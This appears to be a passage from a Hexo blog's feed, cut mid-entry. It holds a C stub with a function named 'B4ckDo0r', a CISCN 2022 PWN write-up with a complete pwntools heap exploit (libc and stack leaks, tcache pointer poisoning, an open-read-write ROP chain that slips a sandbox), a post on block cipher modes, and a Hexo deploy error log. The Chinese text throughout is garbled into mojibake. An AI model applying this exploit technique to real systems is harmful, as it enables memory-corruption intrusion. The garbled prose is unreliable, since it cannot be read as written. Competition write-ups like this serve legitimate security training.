class="hljs-params">(int64)</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;;<br><span class="hljs-type">int</span> <span class="hljs-title function_">takeaway</span><span class="hljs-params">(<span class="hljs-type">char</span> *a1)</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;;<br><span class="hljs-type">int</span> <span class="hljs-title function_">stealkey</span><span class="hljs-params">()</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;;<br><span class="hljs-type">int</span> <span class="hljs-title function_">B4ckDo0r</span><span class="hljs-params">()</span><br>&#123;<br>        save(<span class="hljs-string">&quot;aaaa&quot;</span>,<span class="hljs-string">&quot;aaaa&quot;</span>);<br>        save(<span class="hljs-string">&quot;aaddd&quot;</span>,<span class="hljs-string">&quot;aadd&quot;</span>);<br>        save(<span class="hljs-string">&quot;ssss&quot;</span>,<span class="hljs-string">&quot;sss&quot;</span>);<br>        save(<span class="hljs-string">&quot;ssss&quot;</span>,<span class="hljs-string">&quot;sssss&quot;</span>);<br>        save(<span class="hljs-string">&quot;sssss&quot;</span>,<span class="hljs-string">&quot;sssss&quot;</span>);<br>        save(<span class="hljs-string">&quot;sssss&quot;</span>,<span class="hljs-string">&quot;sssss&quot;</span>);<br>    save(<span class="hljs-string">&quot;sssss&quot;</span>,<span class="hljs-string">&quot;sssss&quot;</span>);<br>        save(<span class="hljs-string">&quot;\x00&quot;</span>,<span class="hljs-string">&quot;ssssss&quot;</span>);<br>        stealkey();<br>        fakekey(<span class="hljs-number">-0x2E19b4</span>);<br>        run();<br> <br>&#125;<br></code></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€CISCN2022ã€‘ä¸œåŒ—èµ›åŒºåˆ†åŒºèµ›PWN WriteUP</title>
    <link href="/2022/06/21/CISCN%202022/"/>
    <url>/2022/06/21/CISCN%202022/</url>
    
    <content type="html"><![CDATA[<h2 id="soil3-amp-mountain1"><a href="#soil3-amp-mountain1" class="headerlink" title="soil3 &amp; mountain1"></a>soil3 &amp; mountain1</h2><ul><li>é¦–å…ˆæ ¹æ®unsorted bin æ³„éœ²å‡ºlibc</li><li>ç„¶åæ ¹æ®libc_base å’Œ <code>libc.bss()</code>å‡½æ•°æ³„éœ²æ ˆåœ°å€</li><li>åˆ©ç”¨orw ROPè¦†ç›–retè¿”å›åœ°å€ï¼Œå¹¶ç»•è¿‡æ²™ç›’æœºåˆ¶</li><li>soil3 é¢˜ç›®ï¼Œå”¯ä¸€çš„åŒºåˆ«å°±æ˜¯æ²¡æœ‰æ²™ç›’ï¼ŒåŸmountainé¢˜ç›®çš„EXPå³å¯é€šè¿‡</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><code class="hljs PYTHON"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-comment"># io = remote(&#x27;172.16.30.186&#x27;,58012)</span><br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;Choice:&#x27;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Please input size:&#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(size))<br>    io.recvuntil(<span class="hljs-string">&#x27;Please input content:&#x27;</span>)<br>    io.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;Choice:&#x27;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Please input idx:&#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;Choice:&#x27;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Please input idx:&#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;Choice:&#x27;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Please input idx:&#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(idx))<br>    <span class="hljs-keyword">if</span> idx&lt;=<span class="hljs-number">32</span>:<br>        io.recvuntil(<span class="hljs-string">&#x27;Please input content:&#x27;</span>)<br>        io.send(content)<br><br><br>add(<span class="hljs-number">0x430</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">0x430</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># pause()</span><br>show(<span class="hljs-number">0</span>)<br><span class="hljs-comment"># io.recvline()</span><br><span class="hljs-comment"># pause()</span><br>libc_base = u64(io.recvuntil(<span class="hljs-string">&#x27;Done&#x27;</span>)[<span class="hljs-number">1</span>:-<span class="hljs-number">4</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - libc.symbols[<span class="hljs-string">&#x27;main_arena&#x27;</span>] - <span class="hljs-number">96</span><br>success(<span class="hljs-string">&#x27;libc_base --&gt;&#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>bss_addr = libc_base + libc.bss()<br>success(<span class="hljs-string">&#x27;bss --&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(bss_addr))<br>flag_addr = bss_addr + <span class="hljs-number">0x200</span><br><span class="hljs-comment"># edit(32,&#x27;&#x27;)</span><br><br>pop_rdi = libc_base +<span class="hljs-number">0x000000000002daa2</span> <span class="hljs-comment">#: pop rdi ; ret</span><br>pop_rsi = libc_base + <span class="hljs-number">0x0000000000037bfa</span><span class="hljs-comment"># : pop rsi ; ret</span><br>pop_rdx = libc_base + <span class="hljs-number">0x0000000000106791</span><span class="hljs-comment"># : pop rdx ; pop r12 ; ret</span><br>pop_rax = libc_base + <span class="hljs-number">0x00000000000446b0</span><span class="hljs-comment"># : pop rax ; ret</span><br>open_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;open&#x27;</span>]<br>read_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br><br><br><br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>key = u64(io.recvuntil(<span class="hljs-string">&#x27;Done&#x27;</span>)[<span class="hljs-number">1</span>:-<span class="hljs-number">4</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>success(<span class="hljs-string">&#x27;key--&gt;&#x27;</span> + <span class="hljs-built_in">hex</span>(key))<br><span class="hljs-comment"># pause()</span><br><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;c&#x27;</span>*<span class="hljs-number">0x40</span>)<br><span class="hljs-comment"># pause()</span><br>free(<span class="hljs-number">0</span>)<br><br>edit(<span class="hljs-number">0</span>,p64((bss_addr-<span class="hljs-number">0x10</span>)^key))<br><span class="hljs-comment"># pause()</span><br>add(<span class="hljs-number">0x400</span>,p64((bss_addr-<span class="hljs-number">0x10</span>)^key))<br><span class="hljs-comment"># pause()</span><br><br>add(<span class="hljs-number">0x400</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br><br><span class="hljs-comment"># pause()</span><br>show(<span class="hljs-number">4</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>stack = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>ret = stack-<span class="hljs-number">0x148</span><br>success(<span class="hljs-string">&#x27;stack_addr --&gt;&#x27;</span> +<span class="hljs-built_in">hex</span>(stack-<span class="hljs-number">0x8</span>))<br>success(<span class="hljs-string">&#x27;ret--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(ret))<br><span class="hljs-comment"># free(1)</span><br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>free(<span class="hljs-number">5</span>)<br>edit(<span class="hljs-number">5</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x40</span>)<br>free(<span class="hljs-number">5</span>)<br>edit(<span class="hljs-number">5</span>,p64((ret)^key))<br><span class="hljs-comment"># pause()</span><br>add(<span class="hljs-number">0x400</span>,p64((ret)^key))<br>pause()<br>orw = <span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span><br>orw += p64(pop_rdi)<br>orw += p64(ret)<br>orw += p64(pop_rsi)<br>orw += p64(<span class="hljs-number">0</span>)<br>orw += p64(pop_rdx)<br>orw += p64(<span class="hljs-number">0</span>)<br>orw += p64(<span class="hljs-number">0</span>)<br>orw += p64(open_addr)<br><br><br><span class="hljs-comment">##read</span><br>orw += p64(pop_rdi)<br>orw += p64(<span class="hljs-number">3</span>)<br>orw += p64(pop_rsi)<br>orw += p64(flag_addr)<br>orw += p64(pop_rdx)<br>orw += p64(<span class="hljs-number">0x100</span>)<br>orw += p64(<span class="hljs-number">0</span>)<br>orw += p64(read_addr)<br><br><span class="hljs-comment">##write</span><br>orw += p64(pop_rdi)<br>orw += p64(<span class="hljs-number">1</span>)<br>orw += p64(pop_rsi)<br>orw += p64(flag_addr)<br>orw += p64(pop_rdx)<br>orw += p64(<span class="hljs-number">0x100</span>)<br>orw += p64(<span class="hljs-number">0</span>)<br>orw += p64(write_addr)<br>add(<span class="hljs-number">0x400</span>,orw)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>åˆ†ç»„å¯†ç çš„äº”ç§å·¥ä½œæ¨¡å¼</title>
    <link href="/2022/06/08/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E7%9A%84%E4%BA%94%E7%A7%8D%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F/"/>
    <url>/2022/06/08/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E7%9A%84%E4%BA%94%E7%A7%8D%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<h2 id="ç”µå­å¯†ç æœ¬æ¨¡å¼Electronic-Codebook-ECB"><a href="#ç”µå­å¯†ç æœ¬æ¨¡å¼Electronic-Codebook-ECB" class="headerlink" title="ç”µå­å¯†ç æœ¬æ¨¡å¼Electronic Codebook, ECB"></a>ç”µå­å¯†ç æœ¬æ¨¡å¼Electronic Codebook, ECB</h2><blockquote><p>æ˜æ–‡åˆ†æˆ64çš„åˆ†ç»„è¿›è¡ŒåŠ å¯†ï¼Œå¿…è¦æ—¶å¡«å……ï¼Œæ¯ä¸ªåˆ†ç»„ç”¨åŒä¸€å¯†é’¥åŠ å¯†ï¼ŒåŒæ ·æ˜æ–‡åˆ†ç»„åŠ å¯†å¾—ç›¸åŒå¯†æ–‡</p></blockquote><h3 id="ç¤ºæ„å›¾"><a href="#ç¤ºæ„å›¾" class="headerlink" title="ç¤ºæ„å›¾"></a>ç¤ºæ„å›¾</h3><p><img src="/img/article/cry-mode/cry1.png" alt="ECB"></p><h3 id="å±€é™æ€§"><a href="#å±€é™æ€§" class="headerlink" title="å±€é™æ€§"></a>å±€é™æ€§</h3><ul><li>ECBæ¨¡å¼ç‰¹åˆ«é€‚åˆæ•°æ®è¾ƒå°‘çš„æƒ…å†µï¼Œå¦‚å®‰å…¨ä¼ è¾“DESå¯†é’¥</li><li>ä¸€æ®µæ˜æ–‡æ¶ˆæ¯ä¸­è‹¥æœ‰å‡ ä¸ªç›¸åŒçš„æ˜æ–‡ç»„ï¼Œåˆ™å¯†æ–‡ä¹Ÿå°†å‡ºç°å‡ ä¸ªç›¸åŒçš„ç‰‡æ®µ</li><li>å¯¹äºå¾ˆé•¿çš„æ¶ˆæ¯ï¼ŒECBæ˜¯ä¸å®‰å…¨çš„ï¼Œå¦‚æœæ¶ˆæ¯æ˜¯éå¸¸ç»“æ„åŒ–çš„ï¼Œå¯†ç åˆ†æå¯èƒ½åˆ©ç”¨å…¶ç»“æ„ç‰¹å¾æ¥ç ´è§£</li><li>ECBçš„å¼±ç‚¹æ¥æºäºå…¶åŠ å¯†è¿‡çš„å¯†æ–‡åˆ†ç»„æ˜¯äº’ç›¸ç‹¬ç«‹çš„</li></ul><h2 id="å¯†æ–‡åˆ†ç»„é“¾æ¥æ¨¡å¼Cipher-Block-Chaining-CBC"><a href="#å¯†æ–‡åˆ†ç»„é“¾æ¥æ¨¡å¼Cipher-Block-Chaining-CBC" class="headerlink" title="å¯†æ–‡åˆ†ç»„é“¾æ¥æ¨¡å¼Cipher Block Chaining (CBC)"></a>å¯†æ–‡åˆ†ç»„é“¾æ¥æ¨¡å¼Cipher Block Chaining (CBC)</h2><blockquote><p>åŠ å¯†è¾“å…¥æ˜¯å½“å‰æ˜æ–‡åˆ†ç»„å’Œå‰ä¸€å¯†æ–‡åˆ†ç»„çš„å¼‚æˆ–ï¼Œå½¢æˆä¸€æ¡é“¾ï¼Œä½¿ç”¨ç›¸åŒçš„å¯†é’¥ï¼Œ è¿™æ ·æ¯ä¸ªæ˜æ–‡åˆ†ç»„çš„åŠ å¯†å‡½æ•°è¾“å…¥ä¸æ˜æ–‡åˆ†ç»„ä¹‹é—´ä¸å†æœ‰å›ºå®šçš„å…³ç³»</p></blockquote><h3 id="ç¤ºæ„å›¾-1"><a href="#ç¤ºæ„å›¾-1" class="headerlink" title="ç¤ºæ„å›¾"></a>ç¤ºæ„å›¾</h3><p><img src="/img/article/cry-mode/cry2.png" alt="CBC"></p><h3 id="ä¼˜ç‚¹å’Œå±€é™"><a href="#ä¼˜ç‚¹å’Œå±€é™" class="headerlink" title="ä¼˜ç‚¹å’Œå±€é™"></a>ä¼˜ç‚¹å’Œå±€é™</h3><ul><li>æ¯ä¸ªå¯†æ–‡åˆ†ç»„ä¾èµ–äºå…¶ä»–æ˜æ–‡åˆ†ç»„ </li><li>æ˜æ–‡æ¶ˆæ¯ä¸­çš„ä»»ä½•ä¸€ç‚¹å˜åŒ–éƒ½ä¼šå½±å“å¯†æ–‡åˆ†ç»„ </li><li>å‘é€æ–¹å’Œæ¥æ”¶æ–¹éœ€è¦å…±äº«åˆå§‹å‘é‡Initial Value(IV)<ul><li>å¦‚æœIVè¢«æ˜æ–‡ä¼ é€ï¼Œåˆ™æ”»å‡»è€…å¯ä»¥æ”¹å˜ç¬¬ä¸€ä¸ªåˆ†ç»„çš„æŸäº›ä½ï¼Œç„¶åé¢„å…ˆæ”¹å˜IVä¸­çš„æŸäº›ä½ï¼Œåˆ™æ¥æ”¶è€…æ”¶åˆ°çš„P1ä¹Ÿå°±ç›¸åº”æ”¹å˜äº†</li><li>å› æ­¤ï¼ŒIVå¿…é¡»æ˜¯ä¸€ä¸ªå›ºå®šçš„å€¼æˆ–è€…å¿…é¡»ç”¨ECBæ–¹å¼åœ¨æ¶ˆæ¯ä¹‹å‰åŠ å¯†ä¼ é€</li></ul></li><li>åœ¨æ¶ˆæ¯çš„æœ€åï¼Œè¿˜è¦å¤„ç†ä¸å¤Ÿé•¿åº¦çš„åˆ†ç»„ <ul><li>å¯ä»¥å¡«å……å·²çŸ¥éæ•°æ®å€¼ï¼Œæˆ–è€…åœ¨æœ€åä¸€å—è¡¥ä¸Šå¡«å……ä½é•¿åº¦</li></ul></li></ul><h2 id="å¯†ç åé¦ˆæ¨¡å¼Cipher-FeedBack-CFB"><a href="#å¯†ç åé¦ˆæ¨¡å¼Cipher-FeedBack-CFB" class="headerlink" title="å¯†ç åé¦ˆæ¨¡å¼Cipher FeedBack (CFB)"></a>å¯†ç åé¦ˆæ¨¡å¼Cipher FeedBack (CFB)</h2><blockquote><ul><li>æ˜¯ä¸€ç§å°†DESè½¬åŒ–æˆæµå¯†ç çš„æŠ€æœ¯ï¼Œä¸å†è¦æ±‚æŠ¥æ–‡è¢«å¡«å……æˆæ•´ä¸ªåˆ†ç»„ï¼Œå¯ä»¥å®æ—¶è¿è¡Œï¼Œå¦‚æœè¦ä¼ è¾“ä¸€ä¸ªå­—ç¬¦æµï¼Œæ¯ä¸ªå­—ç¬¦éƒ½å¯ä»¥ä½¿ç”¨é¢å‘å­—ç¬¦çš„æµå¯†ç åŠ å¯†åç«‹å³ä¼ è¾“ã€‚</li><li>åŠ å¯†ï¼šåŠ å¯†å‡½æ•°çš„è¾“å…¥æ˜¯ä¸€ä¸ª64ä½çš„ç§»ä½å¯„å­˜å™¨ï¼Œäº§ç”Ÿåˆå§‹å‘é‡IVã€‚åŠ å¯†å‡½æ•°é«˜ç«¯jä½ä¸æ˜æ–‡P1çš„ç¬¬ä¸€å•å…ƒå¼‚æˆ–ï¼Œäº§ç”Ÿjä½å¯†æ–‡C1è¿›å…¥ç§»ä½å¯„å­˜å™¨ä½ç«¯ï¼Œç»§ç»­åŠ å¯†ï¼Œä¸P2è¾“å…¥å¼‚æˆ–ï¼Œå¦‚æ­¤é‡å¤ç›´åˆ°æ‰€æœ‰æ˜æ–‡å•å…ƒéƒ½å®ŒæˆåŠ å¯†ã€‚</li><li>è§£å¯†ï¼šé‡‡ç”¨ç›¸åŒæ–¹æ¡ˆï¼Œä½†æ˜¯ä½¿ç”¨åŠ å¯†å‡½æ•°è€Œéè§£å¯†å‡½æ•°</li></ul></blockquote><h3 id="ç¤ºæ„å›¾-2"><a href="#ç¤ºæ„å›¾-2" class="headerlink" title="ç¤ºæ„å›¾"></a>ç¤ºæ„å›¾</h3><p><img src="/img/article/cry-mode/cry3.png" alt="CFB"></p><h3 id="ä¼˜ç¼ºç‚¹"><a href="#ä¼˜ç¼ºç‚¹" class="headerlink" title="ä¼˜ç¼ºç‚¹"></a>ä¼˜ç¼ºç‚¹</h3><ul><li>å½“æ•°æ®ä»¥ä½æˆ–å­—èŠ‚å½¢å¼åˆ°è¾¾æ—¶ä½¿ç”¨éƒ½æ˜¯é€‚å½“çš„ </li><li>æœ€é€šç”¨çš„æ˜¯æµå¯†ç å½¢å¼</li></ul><h2 id="è¾“å‡ºåé¦ˆæ¨¡å¼Output-FeedBack-OFB"><a href="#è¾“å‡ºåé¦ˆæ¨¡å¼Output-FeedBack-OFB" class="headerlink" title="è¾“å‡ºåé¦ˆæ¨¡å¼Output FeedBack (OFB)"></a>è¾“å‡ºåé¦ˆæ¨¡å¼Output FeedBack (OFB)</h2><blockquote><p>ç»“æ„ä¸Šç±»ä¼¼CFBï¼Œä½†æ˜¯OFBä¸­åŠ å¯†å‡½æ•°è¾“å‡ºè¢«åé¦ˆå›ç§»ä½å¯„å­˜å™¨ï¼ŒCFBä¸­æ˜¯å¯†æ–‡å•å…ƒè¢«åé¦ˆå›ç§»ä½å¯„å­˜å™¨ã€‚ä¼˜ç‚¹æ˜¯ä¼ è¾“ä¸­çš„æ¯”ç‰¹å·®é”™ä¸ä¼šä¼ æ’­ï¼Œç¼ºç‚¹æ˜¯æ¯”CFBæ›´å®¹æ˜“å—æŠ¥æ–‡æµç¯¡æ”¹æ”»å‡»ã€‚</p></blockquote><h3 id="ç¤ºæ„å›¾-3"><a href="#ç¤ºæ„å›¾-3" class="headerlink" title="ç¤ºæ„å›¾"></a>ç¤ºæ„å›¾</h3><p><img src="/img/article/cry-mode/cry4.png" alt="OFB"></p><h3 id="ä¼˜ç¼ºç‚¹-1"><a href="#ä¼˜ç¼ºç‚¹-1" class="headerlink" title="ä¼˜ç¼ºç‚¹"></a>ä¼˜ç¼ºç‚¹</h3><ul><li>OFBçš„ä¸€ä¸ªä¼˜ç‚¹æ˜¯ä¼ è¾“è¿‡ç¨‹ä¸­åœ¨æŸä½ä¸Šå‘ç”Ÿçš„é”™è¯¯ä¸ä¼šå½±å“åˆ°å…¶ä»–ä½ã€‚æ¯”å¦‚ï¼ŒC1ä¸­æœ‰1ä½å‘ç”Ÿäº†é”™è¯¯ï¼Œåªä¼šå½±å“åˆ°P1çš„æ¢å¤ï¼Œåç»­çš„æ˜æ–‡å•å…ƒä¸å—å½±å“ã€‚</li><li>OFBçš„ç¼ºç‚¹æ˜¯ï¼ŒæŠ—æ¶ˆæ¯æµç¯¡æ”¹æ”»å‡»çš„èƒ½åŠ›ä¸å¦‚CFBã€‚å³å¯†æ–‡ä¸­çš„æŸä½å–åï¼Œæ¢å¤å‡ºçš„æ˜æ–‡ç›¸åº”ä½ä¹Ÿå–å</li></ul><h2 id="è®¡æ•°å™¨æ¨¡å¼Counter-CTR"><a href="#è®¡æ•°å™¨æ¨¡å¼Counter-CTR" class="headerlink" title="è®¡æ•°å™¨æ¨¡å¼Counter (CTR)"></a>è®¡æ•°å™¨æ¨¡å¼Counter (CTR)</h2><blockquote><ul><li>æ˜¯ä¸€ç§æ–°æ¨¡å¼ï¼Œè™½ç„¶æ—©å°±æå‡ºæ¥äº†</li><li>ä¸OFBå¾ˆåƒï¼Œä½†æ˜¯åŠ å¯†çš„æ˜¯è®¡æ•°å™¨çš„å€¼è€Œä¸æ˜¯ä»»ä½•åé¦ˆå›æ¥çš„å€¼</li><li>æ¯ä¸€ä¸ªæ˜æ–‡åˆ†ç»„éƒ½å¿…é¡»ä½¿ç”¨ä¸€ä¸ªä¸åŒçš„å¯†é’¥å’Œè®¡æ•°å™¨å€¼ï¼Œå†³ä¸è¦é‡å¤ä½¿ç”¨Ci &#x3D; Pi XOR Oi Oi &#x3D; DESK1(i)</li><li>å¯ä»¥ç”¨äºé«˜é€Ÿç½‘ç»œåŠ å¯†ä¸­</li></ul></blockquote><h3 id="ç¤ºæ„å›¾-4"><a href="#ç¤ºæ„å›¾-4" class="headerlink" title="ç¤ºæ„å›¾"></a>ç¤ºæ„å›¾</h3><p><img src="/img/article/cry-mode/cry5.png" alt="CTR"></p><h3 id="ä¼˜ç¼ºç‚¹-2"><a href="#ä¼˜ç¼ºç‚¹-2" class="headerlink" title="ä¼˜ç¼ºç‚¹"></a>ä¼˜ç¼ºç‚¹</h3><ul><li>é«˜æ•ˆ<ul><li>å¯ä»¥åšå¹¶è¡ŒåŠ å¯†</li><li>å¯¹é«˜é€Ÿé“¾è·¯çš„çªå‘æ•°æ®åŠ å¯†å°¤å…¶æœ‰æ•ˆ</li></ul></li><li>å¯ä»¥å¯¹è¢«åŠ å¯†çš„åˆ†ç»„è¿›è¡Œéšæœºå­˜å–</li><li>ç›¸å½“å®‰å…¨</li><li>ç®€æ´</li><li>å¿…é¡»å†³ä¸é‡å¤ä½¿ç”¨å¯†é’¥å’Œè®¡æ•°å™¨å€¼</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hexoéƒ¨ç½²å‡ºç°é”™è¯¯ Error Spawn failed è§£å†³æ–¹å¼(code 128)</title>
    <link href="/2022/06/07/Hexo%E9%83%A8%E7%BD%B2%E5%87%BA%E7%8E%B0%E9%94%99%E8%AF%AF%20Error%20Spawn%20failed%20%E8%A7%A3%E5%86%B3%E6%96%B9%E5%BC%8F/"/>
    <url>/2022/06/07/Hexo%E9%83%A8%E7%BD%B2%E5%87%BA%E7%8E%B0%E9%94%99%E8%AF%AF%20Error%20Spawn%20failed%20%E8%A7%A3%E5%86%B3%E6%96%B9%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<blockquote><p>è®°å½•ä¸€æ¬¡æŠ¥é”™å¤„ç†æ–¹å¼ï¼Œåœ¨æ›´æ–°äº†è‡ªå·±çš„å¿…è¯»ä¹¦ç›®ä¹‹åï¼Œæ‰§è¡Œ hexo clean &amp;&amp; hexo g -d æ—¶å‡ºç°å¦‚ä¸‹é”™è¯¯</p></blockquote><h2 id="é”™è¯¯ä¿¡æ¯ä¸€"><a href="#é”™è¯¯ä¿¡æ¯ä¸€" class="headerlink" title="é”™è¯¯ä¿¡æ¯ä¸€"></a>é”™è¯¯ä¿¡æ¯ä¸€</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">Missing or invalid credentials.<br>Error: connect ECONNREFUSED /run/user/1000/vscode-git-2098f677fa.sock<br>    at PipeConnectWrap.afterConnect [as oncomplete] (node:net:1161:16) &#123;<br>  errno: -111,<br>  code: <span class="hljs-string">&#x27;ECONNREFUSED&#x27;</span>,<br>  syscall: <span class="hljs-string">&#x27;connect&#x27;</span>,<br>  address: <span class="hljs-string">&#x27;/run/user/1000/vscode-git-2098f677fa.sock&#x27;</span><br>&#125;<br>Missing or invalid credentials.<br>Error: connect ECONNREFUSED /run/user/1000/vscode-git-2098f677fa.sock<br>    at PipeConnectWrap.afterConnect [as oncomplete] (node:net:1161:16) &#123;<br>  errno: -111,<br>  code: <span class="hljs-string">&#x27;ECONNREFUSED&#x27;</span>,<br>  syscall: <span class="hljs-string">&#x27;connect&#x27;</span>,<br>  address: <span class="hljs-string">&#x27;/run/user/1000/vscode-git-2098f677fa.sock&#x27;</span><br>&#125;<br>remote: No anonymous write access.<br>fatal: Authentication failed <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;https://github.com/Loora1N/Loora1N.github.io/&#x27;</span><br>FATAL &#123;<br>  err: Error: Spawn failed<br>      at ChildProcess.&lt;anonymous&gt; 